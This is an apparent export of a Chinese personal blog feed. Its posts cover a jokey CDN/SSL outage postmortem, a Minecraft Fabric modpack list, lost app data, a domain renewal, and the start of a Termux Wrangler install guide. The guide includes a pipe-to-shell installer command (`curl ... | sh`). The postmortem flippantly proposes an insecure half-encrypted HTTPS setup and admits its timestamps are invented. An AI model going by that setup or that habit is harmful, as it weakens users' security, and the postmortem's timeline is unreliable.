网关错误，连接源站失败</p><p>又测试了博客的其它附属服务，此时已确认只有博客面向中国的主线有问题。排除面向海外的服务以及评论、图床等系统的问题</p><h2 id="故障止损"><a href="#故障止损" class="headerlink" title="故障止损"></a>故障止损</h2><p><strong>17:10</strong><br>此时我已进入<em>版本控制系统</em> <sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><span class="hint--top hint--rounded" aria-label="Github">[3]</span></a></sup><br><em>数据分析部</em> <sup id="fnref:4" class="footnote-ref"><a href="#fn:4" rel="footnote"><span class="hint--top hint--rounded" aria-label="百度云加速数据、百度统计、Google Analytics、Microsoft Clarity 等">[4]</span></a></sup> 和 <em>依赖审查部</em> <sup id="fnref:5" class="footnote-ref"><a href="#fn:5" rel="footnote"><span class="hint--top hint--rounded" aria-label="Dependabot">[5]</span></a></sup> 都没有报告什么异常</p><p><strong>17:15</strong><br>根据我的检测，自研的 <em>均衡分流系统</em> <sup id="fnref:6" class="footnote-ref"><a href="#fn:6" rel="footnote"><span class="hint--top hint--rounded" aria-label="Vercel、Netlify、Github Pages、Cloudflare Pages 等同时提供同一博客副本的分流">[6]</span></a></sup> 还在积极响应我的请求，处于可用状态。基本确定 百度云加速 - Vercel 链问题的可能性。准备暂停百度云加速 CDN 服务，直连 Vercel CDN 节点尝试止损。</p><p><strong>17:18</strong><br>再次测试，发现博客主站服务<em>仍未恢复</em>，但注意到错误信息变成了 <code>ERR_CERT_DATE_INVALID</code>，SSL 证书过期？</p><p><strong>20:42</strong><br>此时根据我的测试，博客主站服务已恢复正常，观察 <em>数据分析系统</em>，请求异常数量大大降低，业务成功率恢复到 50% 以上。但此时国内走的是直连 Vercel，速度势必会受到影响。</p><h2 id="根因定位"><a href="#根因定位" class="headerlink" title="根因定位"></a>根因定位</h2><p><strong>21:40</strong><br>于是再套上百度云加速，并将 HTTPS 加速模式设为半程加密试图彻底修复问题。</p><p><strong>21:45</strong><br>错误信息变成了 <code>ERR_TOO_MANY_REDIRECTS</code>。并且等了很长时间都没有自行修复</p><p><strong>22:05</strong><br>将百度云加速的 HTTPS 加速模式设回全程严格加密，一切神奇地恢复了。</p><h2 id="原因说明"><a href="#原因说明" class="headerlink" title="原因说明"></a>原因说明</h2><h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>现博客框架基于 HEXO，主要采用 Github Actions 渲染，并自动推送到各个分流服务。主域名 jiecs.top 采用 阿里DNS云解析，针对不同请求自动分流到不同分流服务。目前国内的分流服务是 百度云加速 + Vercel。Vercel 有自带、自动续签且不可禁用的 HTTPS，所以我将百度云加速的 HTTPS 设为了全程严格加密。整套系统到发生故障时已稳定运行快三个月时间。</p><h3 id="诱因"><a href="#诱因" class="headerlink" title="诱因"></a>诱因</h3><p>这三个月时间刚好是 Vercel 申请的 LetsEncrypt 证书的有效期，通常情况下到了有效期 Vercel 会自动续签。但因为百度云加速的全程加密，当 SSL 证书注册商通过 <code>.well-known/*</code> 路径验证域名所有权时，百度云加速发现此时源站的证书已过期，便会返回 502 源站错误，导致源站证书无法自动续签。</p><h3 id="根因"><a href="#根因" class="headerlink" title="根因"></a>根因</h3><p>Vercel 针对这种需要在 Vercel 上套 CDN 的情况有做支持。根据<a href="https://vercel.com/support/articles/using-cloudflare-with-vercel">文档</a>，我们需要在 CDN 中将 <code>.well-known/*</code> 路径设置为允许 HTTP 访问。但百度云加速的特定页面规则并不支持对 HTTPS 加速模式的设置。</p><h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><ol><li>为何故障刚发生时 BU 后台没有关于此事件的任何记录？</li></ol><p>事后复盘发现，虽然 BU 在全球各地都有监控节点，但中国不在全球范围内。博客只在面向中国的主线有问题，自然不会被记录。</p><ol start="2"><li>那为何你们的合作伙伴 —— Google 能发现博客的异常，Google 在中国有机房？</li></ol><p>我咋知道呢。</p><ol start="3"><li>为何直连 Vercel 分流在故障开始阶段也不可用？</li></ol><p>Vercel 在反复试图自动续签失败后动态调整了自动续签的重试间隔，而且续签 SSL 证书要时间。</p><ol start="4"><li>为何在切换分流到确认恢复之间过了将近四个小时？</li></ol><p>我刷B站去了。</p><ol start="5"><li>后续根因定位将百度云加速设为半程加密为何会导致 <code>ERR_TOO_MANY_REDIRECTS</code>？</li></ol><p>Vercel 有不可关闭的<em>强制</em> HTTPS，百度云加速使用 HTTP 向源站请求时源站会返回“重定向到 HTTPS”的信息，而用户浏览器发出的请求已是 HTTPS 了，从而触发了 <code>ERR_TOO_MANY_REDIRECTS</code>。</p><h2 id="优化改进"><a href="#优化改进" class="headerlink" title="优化改进"></a>优化改进</h2><ol><li><p>Vercel 的 HTTPS 证书过期之后会临时自动关掉强制 HTTPS，等它过期我就把百度云加速改成半程加密。管它安全不安全的，浏览器看着安全就行了。</p></li><li><p>故障演练<br>一定多多拉闸👊🤗</p></li></ol><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>事件是真实的，但并没有专门记录，上述大半 <strong>xx:xx</strong> 的时间都是瞎编的</p><p>其它摆烂不写了</p><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>Google Search Console<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://betteruptime.com/">BetterUptime</a> 一个监控网站可用性并提供公开状态页的 Paas 服务<a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span>Github<a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:4" class="footnote-text"><span>百度云加速数据、百度统计、Google Analytics、Microsoft Clarity 等<a href="#fnref:4" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:5" class="footnote-text"><span>Dependabot<a href="#fnref:5" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:6" class="footnote-text"><span>Vercel、Netlify、Github Pages、Cloudflare Pages 等同时提供同一博客副本的分流<a href="#fnref:6" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>这个博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
      <tag>程序</tag>
      
      <tag>日常</tag>
      
      <tag>哔哩哔哩</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[LSOCP] Minecraft 轻量超级优化客户端整合包全新升级</title>
    <link href="/archives/7eb365b6/"/>
    <url>/archives/7eb365b6/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>很久之前我搞过个 <a href="https://www.jiecs.top/archives/394/">超级优化懒人包-Minecraft高版本Fabric生存</a></p><p>但那个的 1.17.1 版本实在有点老了，现在 1.19 都出了，很多模组都大变。</p><div class="note note-light">            <p>比如体素地图(VoxelMap)停更、IRIS 自带汉化，完全兼容钠，自带光影配置（而不需要 IRIS Starline）、铟(Indium)步入正式版等等</p>          </div><p>我没有 1.18.x 的需求，就懒得支持 1.18.x 了，直接 1.19</p><p>既然都跳过一个版本了，那干脆<strong>改个名字</strong></p><div class="note note-success">            <p>改叫 <strong>LSOCP</strong><br>即  <strong>L</strong>ight <strong>S</strong>uper <strong>O</strong>ptimiz <strong>C</strong>lient <strong>P</strong>ackage<br>轻量超级优化客户端整合包</p>          </div><p>名字确实挺长的</p><p>主要特点不会差多少，就是有些模组仅限更替之类的。然后对原先因博客迁移导致格式错误的表格进行重置</p><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul><li>懒人包 内置 PCL 2 启动器和 JDK 17 等环境，各种模组配置已调试好。只需下载一个 ZIP 即可开玩</li><li>Fabric 整合包，轻量</li><li>不含 Optfine，使用开源且效果更好的 钠(Sodium) <del>及一堆元素周期表</del>替代。连接材质等特性也有实现</li><li>附带常用光影、资源包（材质）</li><li>面向客户端，不含向游戏内添加元素的模组</li><li>绝大多数内容均有汉化</li></ul><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>整合包分 FULL 和 MINI 两个版本</p><ul><li><a href="http://ctpan.jiecs.top/d/32856022-49594170-e70ac6">城通网盘</a> 两个版本都包含</li><li><a href="https://jiecs-my.sharepoint.com/:f:/g/personal/i_jiecs_onmicrosoft_com/EuAKe2HDM6tMnv-LonYePj0BcfwlBwmxWaPlOgnCw3Ku6g?e=vDbxDQ">OneDrive</a> 两个版本都包含</li><li><a href="https://wwt.lanzouj.com/b01jna01a">蓝奏云</a> 密码 jiecs.top。因单文件大小限制，只有 MINI 版本</li></ul><h3 id="FULL"><a href="#FULL" class="headerlink" title="FULL"></a>FULL</h3><p>FULL 包含了上述的运行环境，以及 Minecraft 本体、资源文件等。占用空间大，下载耗时长</p><p>大小 911MB，解压后 1.12 GB</p><h3 id="MINI"><a href="#MINI" class="headerlink" title="MINI"></a>MINI</h3><p>MINI 没有上述运行环境，Minecraft 本体、资源文件等也不包含，PCL2 文件补全时需要联网</p><p>大小 77.8 MB，解压后 131 MB</p><h2 id="内容物"><a href="#内容物" class="headerlink" title="内容物"></a>内容物</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><table><thead><tr><th>名称</th><th>说明</th><th>链接</th><th>备注</th></tr></thead><tbody><tr><td><strong>Plain Craft Launcher 2</strong> <em>Release 2.3.0(257.50)</em></td><td>知名 Minecraft Java 启动器</td><td><a href="https://afdian.net/@LTCat">爱发电</a> <a href="https://www.mcbbs.net/thread-719579-1-1.html">MCBBS</a></td><td></td></tr><tr><td><strong>Java SE</strong> <em>17.0.3.1-windows-64x</em></td><td>Minecraft Java 必备运行环境</td><td><a href="https://download.oracle.com/java/17/archive/jdk-17.0.3.1_windows-x64_bin.zip">Oracle</a></td><td>源文件形式无需安装</td></tr><tr><td><strong>.NET Framework</strong> <em>4.8-Runtime-Offline Installer</em></td><td>Plain Craft Launcher 2 必备运行环境</td><td><a href="https://dotnet.microsoft.com/zh-cn/download/dotnet-framework/net48">Microsoft</a></td><td>离线 exe 安装包，大多数系统自带</td></tr></tbody></table><h3 id="模组"><a href="#模组" class="headerlink" title="模组"></a>模组</h3><h4 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h4><table><thead><tr><th>名称</th><th>说明</th><th>链接</th><th>备注</th></tr></thead><tbody><tr><td><strong>自动钓鱼</strong> Autofish <em>0.9.5</em></td><td>可配置的自动钓鱼</td><td><a href="https://github.com/MrTroot/autofish">Github</a></td><td></td></tr><tr><td><strong>Xaero的世界地图</strong> Xaero’s World Map <em>1.24.0</em></td><td>自动缓存、性能不错的地图</td><td><a href="https://chocolateminecraft.com/worldmapdownload.php">官网</a> <a href="https://www.curseforge.com/minecraft/mc-mods/xaeros-world-map">CurseForge</a></td><td>闭源</td></tr><tr><td><strong>Xaero的小地图</strong> Xaero’s Minimap <em>22.10.1</em></td><td>联动 Xaero的世界地图 的小地图</td><td><a href="https://www.curseforge.com/minecraft/mc-mods/xaeros-minimap">CurseForge</a></td><td>依赖 Xaero的世界地图；闭源</td></tr><tr><td><strong>回放</strong> ReplayMod <em>2.6.6</em></td><td>录制游戏内容并可编辑、渲染</td><td><a href="https://www.replaymod.com/">官网</a> <a href="https://github.com/ReplayMod/ReplayMod">Github</a></td><td>FFmpeg 版本 5.0.1 essentials</td></tr><tr><td><strong>一键背包整理Next</strong> Inventory Profiles Next <em>1.5.3</em></td><td>简单的一键背包整理</td><td><a href="https://github.com/blackd/Inventory-Profiles">Github</a></td><td></td></tr><tr><td><strong>缩放</strong> Zoomify <em>5.0.0</em></td><td>C 键放大，可进行许多配置</td><td><a href="https://github.com/isXander/Zoomify">Github</a></td><td>依赖 Fabric Language Kotlin</td></tr></tbody></table><h4 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h4><table><thead><tr><th>名称</th><th>说明</th><th>链接</th><th>备注</th></tr></thead><tbody><tr><td><strong>Fabric API</strong> <em>0.57.0</em></td><td>Fabric 基础 API</td><td><a href="https://fabricmc.net/">官网</a> <a href="https://github.com/FabricMC/fabric">Github</a></td><td>移除将导致绝大多数模组无法工作</td></tr><tr><td><strong>模组菜单</strong> Mod Menu <em>4.0.0</em></td><td>模组列表且是许多模组的配置屏幕 UI</td><td><a href="https://github.com/TerraformersMC/ModMenu">Github</a></td><td>更好的F3、动态FPS 等 9 个模组的配置 GUI 依赖此</td></tr><tr><td><strong>Cloth Config API</strong> <em>1.0.72</em></td><td>部分模组的配置屏幕 API</td><td><a href="https://github.com/shedaniel/cloth-config">Github</a></td><td>更好的F3、动态FPS 等 4 个模组的配置 GUI 依赖此和模组菜单</td></tr><tr><td><strong>Cloth API</strong> <em>4.0.65</em></td><td>部分模组的 API</td><td><a href="https://github.com/shedaniel/cloth-api">Github</a></td><td>界面微调 依赖此</td></tr><tr><td><strong>Architectury API</strong> <em>5.7.28</em></td><td>Forge 和 Fabric 的抽象化调用 API</td><td><a href="https://github.com/architectury/architectury-api">Github</a></td><td>界面微调 依赖此</td></tr><tr><td><strong>Fabric Language Kotlin</strong> <em>1.8.1</em></td><td>提供 Fabric 中 Kotlin 语言支持的 API</td><td><a href="https://github.com/FabricMC/fabric-language-kotlin">Github</a></td><td>缩放 依赖此</td></tr><tr><td><strong>铟</strong> Indium <em>1.0.6</em></td><td>让 Fabric Render API 与 钠 兼容</td><td><a href="https://github.com/comp500/Indium">Github</a></td><td>Lambda的更好的草方块、连接纹理 依赖此</td></tr></tbody></table><h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h4><table><thead><tr><th>名称</th><th>说明</th><th>链接</th><th>备注</th></tr></thead><tbody><tr><td><strong>Iris Shaders</strong> <em>1.2.5</em></td><td>在 Fabric 中与 钠 搭配兼容部分 Optfine 的光影</td><td><a href="https://irisshaders.net/">官网</a> <a href="https://github.com/IrisShaders/Iris">Github</a></td><td>在 模组菜单 或 钠 的视频设置中有可配置选项</td></tr><tr><td><strong>动态声音滤波器</strong> DynamicSoundFilters <em>1.3.0</em></td><td>根据场景对游戏音效添加混响等</td><td><a href="https://www.curseforge.com/minecraft/mc-mods/dynamic-sound-filters">CurseForge</a> <a href="https://bitbucket.org/andre111/dynamicsoundfilters">Bitbucket</a></td><td>在 模组菜单 中有可配置选项</td></tr><tr><td><strong>连接纹理</strong> Continuity <em>2.0.0</em></td><td>玻璃等材质边缘的连接</td><td><a href="https://github.com/PepperCode1/Continuity">Github</a></td><td>依赖 铟</td></tr><tr><td><strong>更多动画</strong> Not Enough Animations <em>1.6.0</em></td><td>增加如划船、看地图等时的玩家模型动画</td><td><a href="https://github.com/tr7zw/NotEnoughAnimations">Github</a></td><td></td></tr><tr><td><strong>Lambda的动态光源</strong> LambDynamicLights <em>2.1.2</em></td><td>比 Optfine 许多细节更好的动态光源</td><td><a href="https://github.com/LambdAurora/LambDynamicLights">Github</a></td><td>在 模组菜单 中有可配置选项</td></tr><tr><td><strong>Lambda的更好的草方块</strong> LambdaBetterGrass <em>1.3.0</em></td><td>比 Optfine 许多细节更好的草方块</td><td><a href="https://github.com/LambdAurora/LambdaBetterGrass">Github</a></td><td>依赖 铟；在 模组菜单 中有可配置选项</td></tr><tr><td><strong>界面微调</strong> Slight Gui Modifications <em>2.2.0</em></td><td>优化界面切换、截图等 UI 动画</td><td><a href="https://github.com/shedaniel/slight-gui-modifications">Github</a></td><td>依赖 Cloth API、Cloth Config API、Architectury API</td></tr></tbody></table><h4 id="显示"><a href="#显示" class="headerlink" title="显示"></a>显示</h4><table><thead><tr><th>名称</th><th>说明</th><th>链接</th><th>备注</th></tr></thead><tbody><tr><td><strong>物品栏HUD+</strong> Inventory HUD+ <em>3.4.2</em></td><td>显示药水效果、盔甲耐久等</td><td><a href="https://github.com/briansemrau/InventoryHUD">Github</a></td><td>独立配置界面</td></tr><tr><td><strong>更好的F3</strong> BetterF3 <em>1.3.1</em></td><td>多语言、彩色且可自定义的 F3</td><td><a href="https://github.com/cominixo/BetterF3">Github</a></td><td>在 模组菜单 中有可配置选项（依赖 Cloth Config API）</td></tr><tr><td><strong>伤害显示</strong> ToroHealth Damage Indicators <em>1</em></td><td>显示攻击掉血和生物血条</td><td><a href="https://github.com/ToroCraft/ToroHealth">Github</a></td><td>配置文件位于 .&#x2F;config&#x2F;torohealth.json 参考<a href="https://www.mcmod.cn/post/2258.html">此处</a></td></tr><tr><td><strong>苹果皮</strong> AppleSkin <em>2.4.0</em></td><td>显示饱和度和食物可恢复饥饿值等</td><td><a href="https://github.com/squeek502/AppleSkin">Github</a></td><td>在 模组菜单 中有可配置选项（依赖 Cloth Config API）</td></tr><tr><td><strong>燃料信息</strong> FuelInfo <em>1.0</em></td><td>显示燃料&#x2F;烈焰棒剩余可烧物品&#x2F;酿造药水数量</td><td><a href="https://github.com/Luligabi1/FuelInfo">Github</a></td><td></td></tr></tbody></table><h4 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h4><table><thead><tr><th>名称</th><th>说明</th><th>链接</th><th>备注</th></tr></thead><tbody><tr><td><strong>钠</strong> Sodium <em>0.4.2</em></td><td>极大地提升帧率并修复许多图形问题</td><td><a href="https://github.com/CaffeineMC/sodium-fabric">Github</a></td><td></td></tr><tr><td><strong>锂</strong> Lithium <em>0.8.0</em></td><td>优化各类计算机制</td><td><a href="https://github.com/CaffeineMC/lithium-fabric">Github</a></td><td></td></tr><tr><td><strong>磷</strong> Phosphor <em>0.8.1</em></td><td>优化光照引擎</td><td><a href="https://github.com/CaffeineMC/phosphor-fabric">Github</a></td><td></td></tr><tr><td><strong>铁氧体磁芯</strong> FerriteCore <em>5.0.0</em></td><td>减少内存占用并牺牲一些帧率</td><td><a href="https://github.com/malte0811/FerriteCore">Github</a></td><td>可能导致帧率不稳定</td></tr><tr><td><strong>氪</strong> Krypton <em>0.2.0</em></td><td>优化网络堆栈</td><td><a href="https://github.com/astei/krypton">Github</a></td><td></td></tr><tr><td><strong>C2ME</strong> <em>0.2.0</em></td><td>优化区块和 IO 加载性能</td><td><a href="https://github.com/RelativityMC/C2ME-fabric">Github</a> <a href="https://modrinth.com/mod/c2me-fabric">Modrinth</a></td><td>可能导致帧率不稳定</td></tr><tr><td><strong>DFU载入优化</strong> LazyDFU <em>0.1.3</em></td><td>优化跨版本升级数据流程来加速游戏启动和载入</td><td><a href="https://github.com/astei/lazydfu">Github</a></td><td></td></tr><tr><td><strong>实体渲染机制优化</strong> Entity Culling Fabric <em>1.5.2</em></td><td>跳过渲染不可见的实体</td><td><a href="https://github.com/tr7zw/EntityCulling">Github</a></td><td>与许多需要渲染大量实体的模组冲突</td></tr><tr><td><strong>动态FPS</strong> Dynamic Fps <em>2.2.0</em></td><td>自动降低游戏窗口在未聚焦时的渲染帧数</td><td><a href="https://github.com/juliand665/Dynamic-FPS">Github</a></td><td>在 模组菜单 中有可配置选项（依赖 Cloth Config API）；可能使部分 AFK 失效</td></tr><tr><td><strong>更好的树叶渲染优化</strong> CullLessLeaves <em>1.0.2</em></td><td>自定义需要渲染的树叶层数</td><td><a href="https://github.com/isXander/CullLessLeaves">Github</a></td><td>在 模组菜单（依赖 Cloth Config API）或 钠 的视频设置中有可配置选项</td></tr><tr><td><strong>更好的床</strong> Better Beds <em>1.2.0</em></td><td>移除床的实体渲染</td><td><a href="https://github.com/TeamMidnightDust/BetterBeds">Github</a></td><td>与部分床相关的模组冲突</td></tr><tr><td><strong>快速箱子渲染</strong> FastChest <em>1.3</em></td><td>移除箱子的动态模型</td><td><a href="https://github.com/FakeDomi/FastChest">Github</a></td><td>在模组菜单中有可配置选项；与修改箱子状态的资源包冲突</td></tr><tr><td><strong>崩溃优化</strong> Not Enough Crashes <em>4.1.6</em></td><td>游戏崩溃时提供更多信息，并能回到标题页面而不需要重新启动游戏</td><td><a href="https://github.com/natanfudge/not-enough-crashes">Github</a> <a href="https://www.curseforge.com/minecraft/mc-mods/not-enough-crashes">CurseForge</a></td><td>据 MCMOD 评论反馈兼容性较差</td></tr><tr><td><strong>输入法冲突修复</strong> IMBlockerFabric <em>1.0.19</em></td><td>在输入法开启时根据场景自动处理输入法输入</td><td><a href="https://github.com/mrjesen/ImBlockerFabric">Github</a></td><td></td></tr><tr><td><strong>禁用聊天举报</strong> No Chat Reports <em>1.2.3</em></td><td>禁用 1.19 中多人游戏新增的聊天举报</td><td><a href="https://github.com/Aizistral-Studios/No-Chat-Reports">Github</a> <a href="https://www.curseforge.com/minecraft/mc-mods/no-chat-reports">CurseForge</a></td><td></td></tr></tbody></table><h3 id="资源包"><a href="#资源包" class="headerlink" title="资源包"></a>资源包</h3><h4 id="功能-1"><a href="#功能-1" class="headerlink" title="功能"></a>功能</h4><table><thead><tr><th>名称</th><th>说明</th><th>链接</th><th>备注</th></tr></thead><tbody><tr><td><strong>生物悬浮血条</strong> Entity Healthbars <em>3.0</em></td><td>如 伤害显示 的世界血条与光影冲突可使用</td><td><a href="https://www.curseforge.com/minecraft/texture-packs/entity-healthbars">CurseForge</a></td><td></td></tr><tr><td><strong>RTX 16x</strong> <em>v6</em></td><td>仿基岩版 RTX PBR 法线材质，可搭配光影实现光追</td><td><a href="https://www.curseforge.com/minecraft/texture-packs/rtx-16x-for-java">CurseForge</a></td><td></td></tr></tbody></table><h4 id="汉化"><a href="#汉化" class="headerlink" title="汉化"></a>汉化</h4><table><thead><tr><th>名称</th><th>说明</th><th>链接</th><th>备注</th></tr></thead><tbody><tr><td><strong>汉化游戏文本+</strong> <em>1.1</em></td><td>汉化闪烁标语、终末之诗等，并添加了许多条闪烁标语</td><td><a href="https://github.com/jiesou/Minecraft-Text-Sinicization">Github</a></td><td></td></tr><tr><td><strong>Xaeros 地图汉化</strong> <em>210826</em></td><td>汉化 Xaeros 地图系列</td><td><a href="https://www.bilibili.com/read/cv11613668">哔哩哔哩</a></td><td>新兵Sinbing 制作</td></tr></tbody></table><h3 id="光影"><a href="#光影" class="headerlink" title="光影"></a>光影</h3><table><thead><tr><th>名称</th><th>说明</th><th>链接</th><th>备注</th></tr></thead><tbody><tr><td><strong>Complementary Shaders</strong> <em>v4.5</em></td><td>魔改自 BSL 的全能光影</td><td><a href="https://www.complementary.dev/">官网</a> <a href="https://www.curseforge.com/minecraft/customization/complementary-shaders">CurseForge</a></td><td>默认关闭</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>一些日常</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
      <tag>Minecraft</tag>
      
      <tag>游戏</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据丢失，杰出兽安卓APP完全弃坑</title>
    <link href="/archives/c357c2fc/"/>
    <url>/archives/c357c2fc/</url>
    
    <content type="html"><![CDATA[<p>阿巴酱的吃屎模块，本来是清理根目录下的各种垃圾文件(夹)的</p><p><img src="https://cdn.jiecs.top/img/2022/06/Screenshot_2022-06-18-23-20-15-884_com.topjohnwu.magisk.png" alt="循环吃掉乱拉屎的文件&#x2F;文件夹"></p><p>之前一直没问题，最近我看它好像出了点问题，不吃垃圾了，于是重启了下模块。结果我一看，整个根目录都没了</p><p>我TM。。。</p><p>而且根目录下新建不了任何文件（夹），禁用掉模块也是如此。当时系统到没啥大问题，就是屏截不了了</p><p>重启了一下，系统完全正常了，但数据全丢了。包括 Android 和里面的 data。FusionApp 2 的工程文件也在 Android&#x2F;data 私有目录里，自然也全没了</p><p>虽然我工程每个版本会备份一次，但最近博客换框架，应用大改，没有发版自然也没有备份。还好最近也懒得折腾了，干脆直接弃坑了</p><p>但调试后已经装在手机上的应用还能提取出来。不是最新的（FusionApp 中可以预览运行），也处于开发中，<a href="http://ctpan.jiecs.top/f/32856022-599029140-86d544">文件链接</a></p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>日常</tag>
      
      <tag>杰出兽安卓APP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>博客域名续费</title>
    <link href="/archives/bfcbf805/"/>
    <url>/archives/bfcbf805/</url>
    
    <content type="html"><![CDATA[<p>jiecs.top 本来要在 2022-07-31 到期，现在又续了一年<br>不出意外的话 jiecs.top 会一直续下去<br>loliis.top 应该也会<br>mumisin.icu 看情况</p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
      <tag>云服务</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Heroku-PagerMaid 现已支持新 Pyrogram 内核</title>
    <link href="/archives/198b4d7c/"/>
    <url>/archives/198b4d7c/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/jiesou/Heroku-PagerMaid/tree/pyro">https://github.com/jiesou/Heroku-PagerMaid/tree/pyro</a></p><p>只需 10s 即可用 Heroku 完全免费搭建 Telegram UserBot PagerMaid<del>（仅包括在线部署输入密钥的时间）</del></p>]]></content>
    
    
    <categories>
      
      <category>动态</category>
      
    </categories>
    
    
    <tags>
      
      <tag>程序</tag>
      
      <tag>Telegram</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于在 Termux 中安装 Wrangler 遇到的问题</title>
    <link href="/archives/238e5292/"/>
    <url>/archives/238e5292/</url>
    
    <content type="html"><![CDATA[<div class="note note-danger">            <p>我刚发现这篇文章是在瞎鸡巴扯完全过时的东西，请不要看我逼逼，直接跳到<a href="#%E6%9B%B4%E6%96%B0">更新</a></p>          </div><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>大概是太多人拿 Cloudflare Workers 翻墙，Cloudflare Workers 的 &lt;workers.dev&gt; 域名最近被墙了</p><p>而本博客的必应图片背景（即上面的这一片风景图）中的跳转部分就是由 Cloudflare Workers 搭建的。而且我还用 Cloudflare Wokers 搭建了许多别的服务，比如一言</p><p>再骂几次万恶的 GFW 也无济于事，还是只能换一个 ServerLess 平台。想了想决定用 Vercel</p><p>Vercel 的部署是相对简单方便的，不用 30 秒即可直接使用 Vercel CLI 创建项目并部署到生产环境。Vercel CLI 的安装也十分简单，可以直接用 <code>npm/yarn</code> 安装，没有任何问题</p><p>我之前部署 Cloudflare Workers 是用的 PC 浏览器打开 Playground 直接编写代码，然而在手机上，Playground 的体验十分糟糕</p><p><img src="https://cdn.jiecs.top/img/2022/05/Screenshot_2022-05-15-11-19-13-139-edit_com.microsoft.emmx.jpg?%3C40" alt="布局混乱，光标乱跳"></p><p>我甚至无法全选复制出代码</p><p>还好 Cloudflare Workers 也提供一个命令行部署方式，可以用命令行把代码提取下来。命令行工具叫 Wrangler CLI</p><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>我按照 <a href="https://developers.cloudflare.com/workers/wrangler/cli-wrangler/install-update/">Wrangler 文档</a>里的安装方式使用 npm 安装：</p><p><img src="https://cdn.jiecs.top/img/2022/05/Screenshot_2022-05-15-18-32-20-441_com.termux.png" alt="Error: Unsupported platform: Linux arm64"></p><p>很快啊，就出问题了！定睛一看，这 Wrangler 居然没有 arm64 的预编译二进制可执行文件！</p><h3 id="使用-Cargo-自行编译安装"><a href="#使用-Cargo-自行编译安装" class="headerlink" title="使用 Cargo 自行编译安装"></a>使用 Cargo 自行编译安装</h3><p>好吧，官方文档还提供了自己编译安装的方法。先切到了 proot 的 Ubuntu</p><div class="note note-light">            <p>安装并切换到 proot 的 Ubuntu：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">pkg install proot-distro<br>proot-distro install ubuntu<br>proot-distro login ubuntu<br></code></pre></td></tr></table></figure><p>然后安装点必要的东西</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt update<br>apt install curl wget git<br></code></pre></td></tr></table></figure>          </div><h4 id="安装-Rust"><a href="#安装-Rust" class="headerlink" title="安装 Rust"></a>安装 Rust</h4><p>照着指示安装了 Rust：<code>curl https://sh.rustup.rs -sSf | sh</code>，然后用 Cargo 编译安装：<code>cargo install wrangler</code></p><h4 id="安装-GCC"><a href="#安装-GCC" class="headerlink" title="安装 GCC"></a>安装 GCC</h4><p>很快又出了问题：</p><p><img src="https://cdn.jiecs.top/img/2022/05/Screenshot_2022-05-15-19-18-09-473_com.tencent.tim.png" alt="error: linker &#39;cc&#39; not found"></p><p>这是 GCC 编译器没有安装，<code>apt install gcc</code> 即可</p><h4 id="安装-Perl"><a href="#安装-Perl" class="headerlink" title="安装 Perl"></a>安装 Perl</h4><p>还有问题：</p><p><img src="https://cdn.jiecs.top/img/2022/05/Screenshot_2022-05-15-19-40-30-793_com.tencent.tim.png" alt="Can&#39;t locate FindBin pm in @INC"></p><p>必应一下找到了：<a href="https://github.com/openssl/openssl/issues/13761">https://github.com/openssl/openssl/issues/13761</a></p><p>明明已经装了 Perl，不过不知道为什么确实还是要用 apt 再装一下：<code>apt install perl</code></p><h4 id="安装-make"><a href="#安装-make" class="headerlink" title="安装 make"></a>安装 make</h4><p>人生哪有一帆风顺，问题：</p><p><img src="https://cdn.jiecs.top/img/2022/05/Screenshot_2022-05-15-19-47-21-571_com.tencent.tim.png" alt="No such file or directory"></p><p>必应：<a href="https://github.com/nushell/nushell/issues/5379">https://github.com/nushell/nushell/issues/5379</a></p><p>解决：<code>apt install make</code></p><h4 id="真的可以安装了"><a href="#真的可以安装了" class="headerlink" title="真的可以安装了"></a>真的可以安装了</h4><p>终于可以 <code>cargo install wrangler</code> 了</p><p>哎？但是？</p><p><img 